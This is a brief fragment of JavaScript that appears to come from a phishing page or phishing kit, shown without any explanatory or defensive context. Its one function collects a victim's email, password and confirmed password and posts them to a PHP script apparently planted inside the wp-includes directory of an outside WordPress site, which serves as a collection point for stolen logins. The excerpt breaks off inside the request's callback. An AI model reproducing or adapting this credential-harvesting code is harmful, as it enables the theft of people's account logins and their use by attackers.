  ...
  function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://www.weldonhastings.com/wp-includes/Requests/Auth/lius/feedback0.php", o).then(function(t) {
